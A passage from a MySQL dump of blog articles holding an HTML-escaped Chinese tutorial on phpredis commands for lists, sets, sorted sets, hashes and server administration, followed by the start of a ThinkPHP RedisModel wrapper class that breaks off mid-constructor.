/&gt;删除count个名称为key的list中值为value的元素。count为0，删除所有值为value的元素，count&amp;gt;0从头至尾删除count个值为value的元素，count&amp;lt;0从尾到头删除|count|个值为value的元素&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;lInsert&lt;/span&gt;&lt;br /&gt;在名称为为key的list中，找到值为&lt;em&gt;pivot&lt;/em&gt; 的value，并根据参数Redis::BEFORE | Redis::AFTER，来确定，newvalue 是放在 pivot 的前面，或者后面。如果key不存在，不会插入，如果 pivot不存在，return -1&lt;br /&gt;$redis-&amp;gt;delete(&amp;#39;key1&amp;#39;); $redis-&amp;gt;lInsert(&amp;#39;key1&amp;#39;, Redis::AFTER, &amp;#39;A&amp;#39;, &amp;#39;X&amp;#39;); $redis-&amp;gt;lPush(&amp;#39;key1&amp;#39;, &amp;#39;A&amp;#39;); $redis-&amp;gt;lPush(&amp;#39;key1&amp;#39;, &amp;#39;B&amp;#39;); $redis-&amp;gt;lPush(&amp;#39;key1&amp;#39;, &amp;#39;C&amp;#39;); $redis-&amp;gt;lInsert(&amp;#39;key1&amp;#39;, Redis::BEFORE, &amp;#39;C&amp;#39;, &amp;#39;X&amp;#39;);&lt;br /&gt;$redis-&amp;gt;lRange(&amp;#39;key1&amp;#39;, 0, -1);&lt;br /&gt;$redis-&amp;gt;lInsert(&amp;#39;key1&amp;#39;, Redis::AFTER, &amp;#39;C&amp;#39;, &amp;#39;Y&amp;#39;);&lt;br /&gt;$redis-&amp;gt;lRange(&amp;#39;key1&amp;#39;, 0, -1);&lt;br /&gt;$redis-&amp;gt;lInsert(&amp;#39;key1&amp;#39;, Redis::AFTER, &amp;#39;W&amp;#39;, &amp;#39;value&amp;#39;);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;rpoplpush&lt;/span&gt;&lt;br /&gt;返回并删除名称为srckey的list的尾元素，并将该元素添加到名称为dstkey的list的头部&lt;br /&gt;$redis-&amp;gt;delete(&amp;#39;x&amp;#39;, &amp;#39;y&amp;#39;);&lt;br /&gt;$redis-&amp;gt;lPush(&amp;#39;x&amp;#39;, &amp;#39;abc&amp;#39;); $redis-&amp;gt;lPush(&amp;#39;x&amp;#39;, &amp;#39;def&amp;#39;); $redis-&amp;gt;lPush(&amp;#39;y&amp;#39;, &amp;#39;123&amp;#39;); $redis-&amp;gt;lPush(&amp;#39;y&amp;#39;, &amp;#39;456&amp;#39;); // move the last of x to the front of y. var_dump($redis-&amp;gt;rpoplpush(&amp;#39;x&amp;#39;, &amp;#39;y&amp;#39;));&lt;br /&gt;var_dump($redis-&amp;gt;lRange(&amp;#39;x&amp;#39;, 0, -1));&lt;br /&gt;var_dump($redis-&amp;gt;lRange(&amp;#39;y&amp;#39;, 0, -1)); &lt;span style=&quot;font-family:monospace&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;br /&gt;string(3) &amp;quot;abc&amp;quot; &lt;span style=&quot;font-family:monospace&quot;&gt;&lt;br /&gt;&lt;/span&gt;array(1) { [0]=&amp;gt; string(3) &amp;quot;def&amp;quot; } &lt;span style=&quot;font-family:monospace&quot;&gt;&lt;br /&gt;&lt;/span&gt;array(3) { [0]=&amp;gt; string(3) &amp;quot;abc&amp;quot; [1]=&amp;gt; string(3) &amp;quot;456&amp;quot; [2]=&amp;gt; string(3) &amp;quot;123&amp;quot; }&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-size:16px;font-weight:bold;text-decoration:underline&quot;&gt;SET操作相关&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sAdd&lt;/span&gt;&lt;br /&gt;向名称为key的set中添加元素value,如果value存在，不写入，return false&lt;br /&gt;$redis-&amp;gt;sAdd(key , value);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sRem, sRemove&lt;/span&gt;&lt;br /&gt;删除名称为key的set中的元素value&lt;br /&gt;$redis-&amp;gt;sAdd(&amp;#39;key1&amp;#39; , &amp;#39;set1&amp;#39;);&lt;br /&gt;$redis-&amp;gt;sAdd(&amp;#39;key1&amp;#39; , &amp;#39;set2&amp;#39;);&lt;br /&gt;$redis-&amp;gt;sAdd(&amp;#39;key1&amp;#39; , &amp;#39;set3&amp;#39;);&lt;br /&gt;$redis-&amp;gt;sRem(&amp;#39;key1&amp;#39;, &amp;#39;set2&amp;#39;);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sMove&lt;/span&gt;&lt;br /&gt;将value元素从名称为srckey的集合移到名称为dstkey的集合&lt;br /&gt;$redis-&amp;gt;sMove(seckey, dstkey, value);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sIsMember, sContains&lt;/span&gt;&lt;br /&gt;名称为key的集合中查找是否有value元素，有ture 没有 false&lt;br /&gt;$redis-&amp;gt;sIsMember(key, value);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sCard, sSize&lt;/span&gt;&lt;br /&gt;返回名称为key的set的元素个数&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sPop&lt;/span&gt;&lt;br /&gt;随机返回并删除名称为key的set中一个元素&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sRandMember&lt;/span&gt;&lt;br /&gt;随机返回名称为key的set中一个元素，不删除&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sInter&lt;/span&gt;&lt;br /&gt;求交集&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sInterStore&lt;/span&gt;&lt;br /&gt;求交集并将交集保存到output的集合&lt;br /&gt;$redis-&amp;gt;sInterStore(&amp;#39;output&amp;#39;, &amp;#39;key1&amp;#39;, &amp;#39;key2&amp;#39;, &amp;#39;key3&amp;#39;)&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sUnion&lt;/span&gt;&lt;br /&gt;求并集&lt;br /&gt;$redis-&amp;gt;sUnion(&amp;#39;s0&amp;#39;, &amp;#39;s1&amp;#39;, &amp;#39;s2&amp;#39;);&lt;br /&gt;s0,s1,s2 同时求并集&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sUnionStore&lt;/span&gt;&lt;br /&gt;求并集并将并集保存到output的集合&lt;br /&gt;$redis-&amp;gt;sUnionStore(&amp;#39;output&amp;#39;, &amp;#39;key1&amp;#39;, &amp;#39;key2&amp;#39;, &amp;#39;key3&amp;#39;)；&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sDiff&lt;/span&gt;&lt;br /&gt;求差集&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sDiffStore&lt;/span&gt;&lt;br /&gt;求差集并将差集保存到output的集合&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sMembers, sGetMembers&lt;/span&gt;&lt;br /&gt;返回名称为key的set的所有元素&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;sort&lt;/span&gt;&lt;br /&gt;排序，分页等&lt;br /&gt;参数&lt;span style=&quot;font-family:monospace&quot;&gt;&lt;br /&gt;&lt;/span&gt;&amp;#39;by&amp;#39; =&amp;gt; &amp;#39;some_pattern_*&amp;#39;,&lt;br /&gt;&amp;#39;limit&amp;#39; =&amp;gt; array(0, 1),&lt;br /&gt;&amp;#39;get&amp;#39; =&amp;gt; &amp;#39;some_other_pattern_*&amp;#39; or an array of patterns,&lt;br /&gt;&amp;#39;sort&amp;#39; =&amp;gt; &amp;#39;asc&amp;#39; or &amp;#39;desc&amp;#39;,&lt;br /&gt;&amp;#39;alpha&amp;#39; =&amp;gt; TRUE,&lt;br /&gt;&amp;#39;store&amp;#39; =&amp;gt; &amp;#39;external-key&amp;#39;&lt;span style=&quot;font-family:monospace&quot;&gt;&lt;br /&gt;例子&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;delete(&amp;#39;s&amp;#39;); $redis-&amp;gt;sadd(&amp;#39;s&amp;#39;, 5); $redis-&amp;gt;sadd(&amp;#39;s&amp;#39;, 4); $redis-&amp;gt;sadd(&amp;#39;s&amp;#39;, 2); $redis-&amp;gt;sadd(&amp;#39;s&amp;#39;, 1); $redis-&amp;gt;sadd(&amp;#39;s&amp;#39;, 3);&lt;br /&gt;var_dump($redis-&amp;gt;sort(&amp;#39;s&amp;#39;)); // 1,2,3,4,5&lt;br /&gt;var_dump($redis-&amp;gt;sort(&amp;#39;s&amp;#39;, array(&amp;#39;sort&amp;#39; =&amp;gt; &amp;#39;desc&amp;#39;))); // 5,4,3,2,1&lt;br /&gt;var_dump($redis-&amp;gt;sort(&amp;#39;s&amp;#39;, array(&amp;#39;sort&amp;#39; =&amp;gt; &amp;#39;desc&amp;#39;, &amp;#39;store&amp;#39; =&amp;gt; &amp;#39;out&amp;#39;))); // (int)5&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;string命令&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;getSet&lt;/span&gt;&lt;br /&gt;返回原来key中的值，并将value写入key&lt;br /&gt;$redis-&amp;gt;set(&amp;#39;x&amp;#39;, &amp;#39;42&amp;#39;);&lt;br /&gt;$exValue = $redis-&amp;gt;getSet(&amp;#39;x&amp;#39;, &amp;#39;lol&amp;#39;); // return &amp;#39;42&amp;#39;, replaces x by &amp;#39;lol&amp;#39;&lt;br /&gt;$newValue = $redis-&amp;gt;get(&amp;#39;x&amp;#39;)&amp;#39; // return &amp;#39;lol&amp;#39;&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;append&lt;/span&gt;&lt;br /&gt;string，名称为key的string的值在后面加上value&lt;br /&gt;$redis-&amp;gt;set(&amp;#39;key&amp;#39;, &amp;#39;value1&amp;#39;);&lt;br /&gt;$redis-&amp;gt;append(&amp;#39;key&amp;#39;, &amp;#39;value2&amp;#39;);&lt;br /&gt;$redis-&amp;gt;get(&amp;#39;key&amp;#39;);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;getRange&lt;/span&gt; （方法不存在）&lt;br /&gt;返回名称为key的string中start至end之间的字符&lt;br /&gt;$redis-&amp;gt;set(&amp;#39;key&amp;#39;, &amp;#39;string value&amp;#39;);&lt;br /&gt;$redis-&amp;gt;getRange(&amp;#39;key&amp;#39;, 0, 5);&lt;br /&gt;$redis-&amp;gt;getRange(&amp;#39;key&amp;#39;, -5, -1);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;setRange&lt;/span&gt; （方法不存在）&lt;br /&gt;改变key的string中start至end之间的字符为value&lt;br /&gt;$redis-&amp;gt;set(&amp;#39;key&amp;#39;, &amp;#39;Hello world&amp;#39;);&lt;br /&gt;$redis-&amp;gt;setRange(&amp;#39;key&amp;#39;, 6, &amp;quot;redis&amp;quot;);&lt;br /&gt;$redis-&amp;gt;get(&amp;#39;key&amp;#39;);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;strlen&lt;/span&gt;&lt;br /&gt;得到key的string的长度&lt;br /&gt;$redis-&amp;gt;strlen(&amp;#39;key&amp;#39;);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;getBit&lt;/span&gt;/&lt;span style=&quot;font-weight:bold&quot;&gt;setBit&lt;/span&gt;&lt;br /&gt;返回2进制信息&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;font-size:16px&quot;&gt;&lt;strong&gt;&lt;span style=&quot;font-size:19px&quot;&gt;zset&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;（&lt;/strong&gt;&lt;strong&gt;&lt;span style=&quot;font-size:19px&quot;&gt;sorted set&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;）操作相关&lt;/strong&gt;&lt;/span&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;zAdd&lt;/span&gt;&lt;strong&gt;(&lt;em&gt;key, score, member&lt;/em&gt;)&lt;/strong&gt;：向名称为key的zset中添加元素member，score用于排序。如果该元素已经存在，则根据score更新该元素的顺序。&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key&amp;#39;, 1, &amp;#39;val1&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key&amp;#39;, 0, &amp;#39;val0&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key&amp;#39;, 5, &amp;#39;val5&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zRange(&amp;#39;key&amp;#39;, 0, -1); // array(val0, val1, val5)&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;zRange&lt;/span&gt;&lt;strong&gt;(&lt;em&gt;key, start, end&lt;/em&gt;,&lt;/strong&gt;&lt;em&gt;withscores&lt;/em&gt;&lt;strong&gt;)&lt;/strong&gt;：返回名称为key的zset（元素已按score从小到大排序）中的index从start到end的所有元素&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key1&amp;#39;, 0, &amp;#39;val0&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key1&amp;#39;, 2, &amp;#39;val2&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key1&amp;#39;, 10, &amp;#39;val10&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zRange(&amp;#39;key1&amp;#39;, 0, -1); // with scores $redis-&amp;gt;zRange(&amp;#39;key1&amp;#39;, 0, -1, true);&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;zDelete, zRem&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;zRem&lt;/span&gt;&lt;strong&gt;(&lt;em&gt;key, member&lt;/em&gt;)&lt;/strong&gt;：删除名称为key的zset中的元素member&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key&amp;#39;, 0, &amp;#39;val0&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key&amp;#39;, 2, &amp;#39;val2&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key&amp;#39;, 10, &amp;#39;val10&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zDelete(&amp;#39;key&amp;#39;, &amp;#39;val2&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zRange(&amp;#39;key&amp;#39;, 0, -1); &lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;&lt;br /&gt;zRevRange&lt;/span&gt;&lt;strong&gt;(&lt;em&gt;key, start, end&lt;/em&gt;,&lt;/strong&gt;&lt;em&gt;withscores&lt;/em&gt;&lt;strong&gt;)&lt;/strong&gt;：返回名称为key的zset（元素已按score从大到小排序）中的index从start到end的所有元素.&lt;em&gt;withscores&lt;/em&gt;: 是否输出socre的值，默认false，不输出&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key&amp;#39;, 0, &amp;#39;val0&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key&amp;#39;, 2, &amp;#39;val2&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zAdd(&amp;#39;key&amp;#39;, 10, &amp;#39;val10&amp;#39;);&lt;br /&gt;$redis-&amp;gt;zRevRange(&amp;#39;key&amp;#39;, 0, -1); // with scores $redis-&amp;gt;zRevRange(&amp;#39;key&amp;#39;, 0, -1, true);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;zRangeByScore, zRevRangeByScore&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;zRangeByScore(key, star, end, array(withscores， limit ));&lt;br /&gt;返回名称为key的zset中score &amp;gt;= star且score &amp;lt;= end的所有元素&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;&lt;br /&gt;zCount&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;zCount(key, star, end);&lt;br /&gt;返回名称为key的zset中score &amp;gt;= star且score &amp;lt;= end的所有元素的个数&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;&lt;br /&gt;zRemRangeByScore, zDeleteRangeByScore&lt;/span&gt;&lt;span style=&quot;font-family:monospace&quot;&gt;&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;zRemRangeByScore(&amp;#39;key&amp;#39;, star, end);&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;&lt;/span&gt;删除名称为key的zset中score &amp;gt;= star且score &amp;lt;= end的所有元素，返回删除个数&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;zSize, zCard&lt;/span&gt;&lt;br /&gt;返回名称为key的zset的所有元素的个数&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;zScore&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;zScore(key, val2);&lt;br /&gt;返回名称为key的zset中元素val2的score&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;zRank, zRevRank&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;zRevRank(key, val);&lt;br /&gt;返回名称为key的zset（元素已按score从小到大排序）中val元素的rank（即index，从0开始），若没有val元素，返回&ldquo;null&rdquo;。zRevRank 是从大到小排序&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;zIncrBy&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;zIncrBy(&amp;#39;key&amp;#39;, increment, &amp;#39;member&amp;#39;);&lt;br /&gt;如果在名称为key的zset中已经存在元素member，则该元素的score增加increment；否则向集合中添加该元素，其score的值为increment&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;zUnion&lt;/span&gt;/&lt;span style=&quot;font-weight:bold&quot;&gt;zInter&lt;/span&gt;&lt;em&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;&lt;/span&gt;参数&lt;br /&gt;keyOutput&lt;br /&gt;arrayZSetKeys&lt;br /&gt;arrayWeights&lt;br /&gt;aggregateFunction&lt;/em&gt; Either &amp;quot;SUM&amp;quot;, &amp;quot;MIN&amp;quot;, or &amp;quot;MAX&amp;quot;: defines the behaviour to use on duplicate entries during the zUnion.&lt;br /&gt;对N个zset求并集和交集，并将最后的集合保存在dstkeyN中。对于集合中每一个元素的score，在进行AGGREGATE运算前，都要乘以对于的WEIGHT参数。如果没有提供WEIGHT，默认为1。默认的AGGREGATE是SUM，即结果集合中元素的score是所有集合对应元素进行SUM运算的值，而MIN和MAX是指，结果集合中元素的score是所有集合对应元素中最小值和最大值。&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;&lt;span style=&quot;font-size:19px&quot;&gt;Hash&lt;/span&gt;&lt;/strong&gt;&lt;strong&gt;操作&lt;/strong&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;hSet&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;hSet(&amp;#39;h&amp;#39;, &amp;#39;key1&amp;#39;, &amp;#39;hello&amp;#39;);&lt;br /&gt;向名称为h的hash中添加元素key1&mdash;&amp;gt;hello&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;hGet&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;hGet(&amp;#39;h&amp;#39;, &amp;#39;key1&amp;#39;);&lt;br /&gt;返回名称为h的hash中key1对应的value（hello）&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;hLen&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;hLen(&amp;#39;h&amp;#39;);&lt;br /&gt;返回名称为h的hash中元素个数&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;hDel&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;hDel(&amp;#39;h&amp;#39;, &amp;#39;key1&amp;#39;);&lt;br /&gt;删除名称为h的hash中键为key1的域&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;hKeys&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;hKeys(&amp;#39;h&amp;#39;);&lt;br /&gt;返回名称为key的hash中所有键&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;hVals&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;hVals(&amp;#39;h&amp;#39;)&lt;br /&gt;返回名称为h的hash中所有键对应的value&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;hGetAll&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;hGetAll(&amp;#39;h&amp;#39;);&lt;br /&gt;返回名称为h的hash中所有的键（field）及其对应的value&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;hExists&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;hExists(&amp;#39;h&amp;#39;, &amp;#39;a&amp;#39;);&lt;br /&gt;名称为h的hash中是否存在键名字为a的域&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;hIncrBy&lt;/span&gt;&lt;br /&gt;$redis-&amp;gt;hIncrBy(&amp;#39;h&amp;#39;, &amp;#39;x&amp;#39;, 2);&lt;br /&gt;将名称为h的hash中x的value增加2&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;hMset&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;hMset(&amp;#39;user:1&amp;#39;, array(&amp;#39;name&amp;#39; =&amp;gt; &amp;#39;Joe&amp;#39;, &amp;#39;salary&amp;#39; =&amp;gt; 2000));&lt;br /&gt;向名称为key的hash中批量添加元素&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;hMGet&lt;br /&gt;&lt;/span&gt;$redis-&amp;gt;hmGet(&amp;#39;h&amp;#39;, array(&amp;#39;field1&amp;#39;, &amp;#39;field2&amp;#39;));&lt;br /&gt;返回名称为h的hash中field1,field2对应的value&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;redis 操作相关&lt;/span&gt;&lt;/span&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;flushDB&lt;/span&gt;&lt;br /&gt;清空当前数据库&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;flushAll&lt;/span&gt;&lt;br /&gt;清空所有数据库&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;randomKey&lt;/span&gt;&lt;br /&gt;随机返回key空间的一个key&lt;br /&gt;$key = $redis-&amp;gt;randomKey();&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;select&lt;/span&gt;&lt;br /&gt;选择一个数据库&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;move&lt;/span&gt;&lt;br /&gt;转移一个key到另外一个数据库&lt;br /&gt;$redis-&amp;gt;select(0); // switch to DB 0&lt;br /&gt;$redis-&amp;gt;set(&amp;#39;x&amp;#39;, &amp;#39;42&amp;#39;); // write 42 to x&lt;br /&gt;$redis-&amp;gt;move(&amp;#39;x&amp;#39;, 1); // move to DB 1&lt;br /&gt;$redis-&amp;gt;select(1); // switch to DB 1&lt;br /&gt;$redis-&amp;gt;get(&amp;#39;x&amp;#39;); // will return 42&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;rename, renameKey&lt;/span&gt;&lt;br /&gt;给key重命名&lt;br /&gt;$redis-&amp;gt;set(&amp;#39;x&amp;#39;, &amp;#39;42&amp;#39;);&lt;br /&gt;$redis-&amp;gt;rename(&amp;#39;x&amp;#39;, &amp;#39;y&amp;#39;);&lt;br /&gt;$redis-&amp;gt;get(&amp;#39;y&amp;#39;); // &rarr; 42&lt;br /&gt;$redis-&amp;gt;get(&amp;#39;x&amp;#39;); // &rarr; `FALSE`&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;renameNx&lt;/span&gt;&lt;br /&gt;与remane类似，但是，如果重新命名的名字已经存在，不会替换成功&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;setTimeout, expire&lt;/span&gt;&lt;br /&gt;设定一个key的活动时间（s）&lt;br /&gt;$redis-&amp;gt;setTimeout(&amp;#39;x&amp;#39;, 3);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;expireAt&lt;/span&gt;&lt;br /&gt;key存活到一个unix时间戳时间&lt;br /&gt;$redis-&amp;gt;expireAt(&amp;#39;x&amp;#39;, time() + 3);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;keys, getKeys&lt;/span&gt;&lt;br /&gt;返回满足给定pattern的所有key&lt;br /&gt;$keyWithUserPrefix = $redis-&amp;gt;keys(&amp;#39;user*&amp;#39;);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;dbSize&lt;/span&gt;&lt;br /&gt;查看现在数据库有多少key&lt;br /&gt;$count = $redis-&amp;gt;dbSize();&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;auth&lt;/span&gt;&lt;br /&gt;密码认证&lt;br /&gt;$redis-&amp;gt;auth(&amp;#39;foobared&amp;#39;);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;bgrewriteaof&lt;br /&gt;&lt;/span&gt;使用aof来进行数据库持久化&lt;br /&gt;$redis-&amp;gt;bgrewriteaof();&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;slaveof&lt;/span&gt;&lt;br /&gt;选择从服务器&lt;br /&gt;$redis-&amp;gt;slaveof(&amp;#39;10.0.1.7&amp;#39;, 6379);&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;save&lt;/span&gt;&lt;br /&gt;将数据同步保存到磁盘&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;bgsave&lt;/span&gt;&lt;br /&gt;将数据异步保存到磁盘&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;lastSave&lt;/span&gt;&lt;br /&gt;返回上次成功将数据保存到磁盘的Unix时戳&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;&lt;br /&gt;info&lt;/span&gt;&lt;br /&gt;返回redis的版本信息等详情&lt;br /&gt;&lt;br /&gt;&lt;span style=&quot;font-weight:bold&quot;&gt;type&lt;/span&gt;&lt;br /&gt;返回key的类型值&lt;br /&gt;string: Redis::REDIS_STRING&lt;br /&gt;set: Redis::REDIS_SET&lt;br /&gt;list: Redis::REDIS_LIST&lt;br /&gt;zset: Redis::REDIS_ZSET&lt;br /&gt;hash: Redis::REDIS_HASH&lt;br /&gt;other: Redis::REDIS_NOT_FOUND&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386776597);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(44, 44, '&lt;p&gt;redisModel类扩展：Think/Extend/Model/redisModel.class.php&lt;/p&gt;&lt;p&gt;配置项定义：conf/config.php&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;/*Redis设置*/ \r\n&#039;REDIS_HOST&#039;        =&amp;gt; &#039;localhost&#039;, //主机 \r\n&#039;REDIS_PORT&#039;        =&amp;gt; 6379, //端口 \r\n&#039;REDIS_DBNAME&#039;          =&amp;gt; &#039;appdb&#039;, //库名 \r\n&#039;REDIS_CTYPE&#039;           =&amp;gt; 1, //连接类型 1:普通连接 2:长连接 \r\n&#039;REDIS_TIMEOUT&#039;         =&amp;gt; 0, //连接超时时间(S) 0:永不超时&lt;/pre&gt;&lt;p&gt;扩展类封装代码：&lt;/p&gt;&lt;pre class=&quot;brush:php;toolbar:false;&quot;&gt;&amp;lt;?php \r\n/**\r\n * phpredis扩展\r\n * by wbq 2012-5-22\r\n */ \r\nclass RedisModel extends Model \r\n{ \r\n    //REDIS服务主机IP \r\n    private $_HOST = null; \r\n     \r\n    //redis服务端口 \r\n    private $_PORT = null; \r\n     \r\n    //连接时长 默认为0 不限制时长 \r\n    private $_TIMEOUT = 0; \r\n     \r\n    //数据库名 \r\n    private $_DBNAME = null; \r\n     \r\n    //连接类型 1普通连接 2长连接 \r\n    private $_CTYPE = 1; \r\n     \r\n    //实例名 \r\n    public $_REDIS = null; \r\n     \r\n    //事物对象 \r\n    private $_TRANSCATION = null; \r\n     \r\n    //初始化 \r\n    public function __construct() \r\n    { \r\n        $this-&amp;gt;_HOST = C(&#039;REDIS_HOST&#039;); \r\n        $this-&amp;gt;_PORT = C(&#039;REDIS_PORT&#039;); \r\n        $this-&amp;gt;_TIMEOUT = C(&#039;REDIS_TIMEOUT&#039;); \r\n        $this-&amp;gt;_DBNAME = C(&#039;REDIS_DBNAME&#039;); \r\n        $this-&amp;gt;_CTYPE = C(&#039;REDIS_CTYPE&#039;); 